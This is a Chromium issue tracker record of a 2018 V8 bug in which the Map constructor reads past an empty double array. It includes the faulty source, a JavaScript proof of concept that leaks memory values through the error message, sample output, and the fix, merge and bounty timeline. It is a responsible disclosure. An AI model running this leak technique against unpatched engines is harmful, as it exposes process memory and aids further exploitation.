# Security: [v8] Information Leak in Map constructor

| Field | Value |
|-------|-------|
| **Issue ID** | [40091244](https://issues.chromium.org/issues/40091244) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Blink>JavaScript |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | cw...@gmail.com |
| **Assignee** | jg...@chromium.org |
| **Created** | 2018-04-28 |
| **Bounty** | $4,500.00 |

## Description

**VULNERABILITY DETAILS**  

When Map constructor takes double elements fast array as an input, it throws an exception and print the first element of the given array even though the array is empty, thus it could lead to OOB read.

See the following code in src/builtins/builtins-collection-gen.cc. it directly loads the first element of an array for an exception message without any boundary check.

```
void BaseCollectionsAssembler::AddConstructorEntriesFromFastJSArray(  
    Variant variant, TNode<Context> context, TNode<Context> native_context,  
    TNode<Object> collection, TNode<JSArray> fast_jsarray,  
    Label\* if_may_have_side_effects) {  
 ...  
  BIND(&if_doubles);  
  {  
    // A Map constructor requires entries to be arrays (ex. [key, value]),  
    // so a FixedDoubleArray can never succeed.  
    if (variant == kMap || variant == kWeakMap) {  
      TNode<Float64T> element =  
          UncheckedCast<Float64T>(LoadFixedDoubleArrayElement(  
              elements, IntPtrConstant(0), MachineType::Float64(), 0,  // <---- Load the first element without any check  
              INTPTR_PARAMETERS));  
      ThrowTypeError(context, MessageTemplate::kIteratorValueNotAnObject,  
                     AllocateHeapNumberWithValue(element));  
    } else {  

```

**VERSION**  

V8 6.6.346.26 (stable)

**REPRODUCTION CASE**

```
const double2int = (v) => {  
  let buf = new ArrayBuffer(8);  
  let farr = new Float64Array(buf);  
  let iarr = new Uint32Array(buf);  
  farr[0] = v;  
  let d = (iarr[1] \* 0x100000000) + iarr[0];  
  return d;  
};  
  
try {  
  // Create a double elements array.  
  let iterable = new Array(10);  
  for (let i = 0; i < 10; i++) {  
    iterable[i] = 123.123;  
  }  
  
  iterable.length = 0;  
  
  new Map(iterable);  
} catch (e) {  
  console.log(e);  
  let regex = /TypeError: Iterator value ([0-9\.e\-]+) is not an entry object/;  
  let val = parseFloat(regex.exec(e)[1]);  
  console.log(`Memory Value: ${double2int(val).toString(16)}`);  
}  

```

When I run this code, I can read some memory value.

```
$ ./out/x64.release/d8  
V8 version 6.6.346.26  
d8>  
$ ./out/x64.release/d8 ./test_collection.js  
TypeError: Iterator value 2.7728071084073e-310 is not an entry object  
Memory Value: 330afa382431  
$ ./out/x64.release/d8 ./test_collection.js  
TypeError: Iterator value 3.46540415415403e-310 is not an entry object  
Memory Value: 3fcadf382431  

```

## Attachments

- [out.pdf](attachments/out.pdf) (application/pdf, 3.4 KB)

## Timeline

### cw...@gmail.com (2018-04-28)

This is a fix: https://crrev.com/c/1034043

btw, while I can reliably reproduce this vulnerability on v8 6.6.346.26 and nodejs 10.0.0, I cannot reproduce this on Chromium stable (macOS). It's weird. anyone knows why?

### el...@chromium.org (2018-04-29)

Thanks for the report and the patch!

[Monorail components: Blink>JavaScript]

### cw...@gmail.com (2018-04-29)

I found that the precondition to trigger this fast path was too strong for Chromium stable, so it was a bit difficult to trigger this bug in html pages on stable version. But, we can still reliably reproduce this on pdfium stable because it creates a new isolate. Thus, it's indeed a bug affecting stable channel. Check the attached file (out.pdf). 

I also have confirmed that the strong condition was patched and loosened in beta. so, we can trigger this even in html pages on beta.

### cl...@chromium.org (2018-04-30)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=6198840223596544.

### el...@chromium.org (2018-04-30)

Jakob, can you PTAL?

### sh...@chromium.org (2018-05-01)

[Empty comment from Monorail migration]

### jg...@chromium.org (2018-05-02)

Indeed looks like a possible OOB read. 

It's also a spec violation to throw if the iterator is empty. See https://tc39.github.io/ecma262/#sec-map-iterable, which only throws in step 9.d.i. 

The CL in #1 seems like a good fix to both the OOB read and the spec violation.

+gsathya fyi.

### bu...@chromium.org (2018-05-02)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8.git/+/c77c869cd1f4928d3ce5f04a6d21ec6429ea8b72

commit c77c869cd1f4928d3ce5f04a6d21ec6429ea8b72
Author: Choongwoo Han <cwhan.tunz@gmail.com>
Date: Wed May 02 12:03:26 2018

Do not throw if the array is empty in Map constructor

Bug: chromium:837939
Change-Id: Iaca2bc5b52f47d8add13ed9b82497a53cb522933
Reviewed-on: https://chromium-review.googlesource.com/1034043
Reviewed-by: Jakob Gruber <jgruber@chromium.org>
Commit-Queue: Jakob Gruber <jgruber@chromium.org>
Cr-Commit-Position: refs/heads/master@{#52913}
[modify] https://crrev.com/c77c869cd1f4928d3ce5f04a6d21ec6429ea8b72/src/builtins/builtins-collections-gen.cc
[add] https://crrev.com/c77c869cd1f4928d3ce5f04a6d21ec6429ea8b72/test/mjsunit/es6/regress/regress-crbug-837939.js


### jg...@chromium.org (2018-05-02)

[Empty comment from Monorail migration]

### jg...@chromium.org (2018-05-02)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-05-02)

This bug requires manual review: M67 has already been promoted to the beta branch, so this requires manual review
Please contact the milestone owner if you have questions.
Owners: cmasso@(Android), cmasso@(iOS), kbleicher@(ChromeOS), govind@(Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2018-05-02)

[Empty comment from Monorail migration]

### go...@chromium.org (2018-05-02)

+awhalley@ (Security TPM) for M67 merge review. Thank you.

### go...@chromium.org (2018-05-02)

awhalley@ to check tomorrow on canary.

### aw...@google.com (2018-05-04)

govind@ - good for 67

### go...@chromium.org (2018-05-04)

Approving merge to M67 branch 3396 based on https://crbug.com/chromium/837939#c16. Please merge ASAP. Thank you.

### bu...@chromium.org (2018-05-07)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8.git/+/556a5e2ba591a06f5560e0a40408f77fd97f9179

commit 556a5e2ba591a06f5560e0a40408f77fd97f9179
Author: Choongwoo Han <cwhan.tunz@gmail.com>
Date: Mon May 07 08:01:41 2018

Merged: Do not throw if the array is empty in Map constructor

No-Presubmit: true
No-Tree-Checks: true
No-Try: true
Bug: chromium:837939
Change-Id: Iaca2bc5b52f47d8add13ed9b82497a53cb522933
Reviewed-on: https://chromium-review.googlesource.com/1034043
Reviewed-by: Jakob Gruber <jgruber@chromium.org>
Commit-Queue: Jakob Gruber <jgruber@chromium.org>
Cr-Original-Commit-Position: refs/heads/master@{#52913}(cherry picked from commit c77c869cd1f4928d3ce5f04a6d21ec6429ea8b72)
Reviewed-on: https://chromium-review.googlesource.com/1045926
Cr-Commit-Position: refs/branch-heads/6.7@{#59}
Cr-Branched-From: 8457e810efd34381448d51d93f50079cf1f6a812-refs/heads/6.7.288@{#2}
Cr-Branched-From: e921be5c4f2c6407936bde750992dedbf47c1016-refs/heads/master@{#52547}
[modify] https://crrev.com/556a5e2ba591a06f5560e0a40408f77fd97f9179/src/builtins/builtins-collections-gen.cc
[add] https://crrev.com/556a5e2ba591a06f5560e0a40408f77fd97f9179/test/mjsunit/es6/regress/regress-crbug-837939.js


### jg...@chromium.org (2018-05-07)

[Empty comment from Monorail migration]

### aw...@google.com (2018-05-07)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-05-09)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
*********************************

### aw...@google.com (2018-05-09)

Nice on cwhan.tunz@, the VRP panel decided to award $4,000 for this report, and $500 for the patch. Cheers!

### aw...@chromium.org (2018-05-09)

[Empty comment from Monorail migration]

### cw...@gmail.com (2018-05-10)

Thanks :)

### aw...@chromium.org (2018-05-29)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-05-29)

[Empty comment from Monorail migration]

### ha...@chromium.org (2018-06-20)

[Empty comment from Monorail migration]

### ha...@chromium.org (2018-06-26)

[Empty comment from Monorail migration]

### ha...@chromium.org (2018-06-26)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-08-08)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### aw...@chromium.org (2019-06-27)

[Empty comment from Monorail migration]

### is...@google.com (2019-06-27)

This issue was migrated from crbug.com/chromium/837939?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40091244)*
